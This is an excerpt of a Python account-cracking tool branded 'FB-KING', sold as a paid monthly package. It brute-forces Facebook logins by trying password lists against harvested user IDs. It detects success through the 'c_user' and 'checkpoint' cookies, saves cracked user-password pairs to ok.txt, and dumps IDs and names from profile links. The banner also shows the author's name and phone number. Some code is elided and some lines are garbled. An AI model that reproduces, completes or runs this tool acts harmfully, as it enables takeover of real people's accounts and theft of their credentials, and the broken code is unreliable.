...
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, thremahinng, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as mahinabba
from concurrent.futures import ThreadPoolExecutor as mahinabba
from datetime import datetime
from bs4 import BeautifulSoup
...
N = '\033[0m'	# WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QmahinRMahar
...
def main():
    ...
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    mahin = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if mahin in ('1', '01'):
        __crack__().plerr()
    if mahin in ('2', '02'):
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mmahin\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				mahinagents = random.choice(liners)
			except (KeyError, IOError):
				mahinagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32m[FB-KING-OK]\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30m[FB-KING-CP]\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mmahin\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[[FB-KING-CP]] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[[FB-KING-CP]] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .mahin1.txt')
    os.system('rm -rf .mahin12.txt')
    ...
    print(50*"\033[1;97m_")
    _mahin__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _mahin__ in ('1', '01'):
        __cracking__().plerr()
    if _mahin__ in ('0', '00'):
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .mahin1.txt | grep '+li+' >> .mahin12.txt')
    ...
    os.system('clear')
    lines = open('.mahin12.txt', 'r').readlines()
    print(banner)
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mmahin\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
    ...
    version()
if not os.path.exists(".mahinwork.txt"):
	open(".mahinwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ...
        print('\n')
banner = """
  \033[1;32m   ______ ____        _  _______ _   _  _____ 
  \033[1;31m |  ____|  _ \      | |/ /_   _| \ | |/ ____|
  \033[1;33m| |__  | |_) |_____| ' /  | | |  \| | |  __ 
  \033[1;34m |  __| |  _ <______|  <   | | | . ` | | |_ |
  \033[1;35m | |    | |_) |     | . \ _| |_| |\  | |__| |
  \033[1;37m|_|    |____/      |_|\_\_____|_| \_|\_____|
  \033[1;34m 
  \033[1;34m                                                      CYBER
...
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m FB-KING      │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Mahin Ahmed   │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +8801841004250│\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB \033[1;31m:\033[1;32m FB- │\033[1;37m  • \033[1;36mKING \033[1;31m= \033[1;36m300TK \033[1;37m•   \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│         \033[1;37m• 𝐈𝐭𝐬 𝐓𝐎𝐎𝐋𝐒 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 [𝐅𝐁-𝐊𝐈𝐍𝐆] \033[1;37m•      \033[1;32m │
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
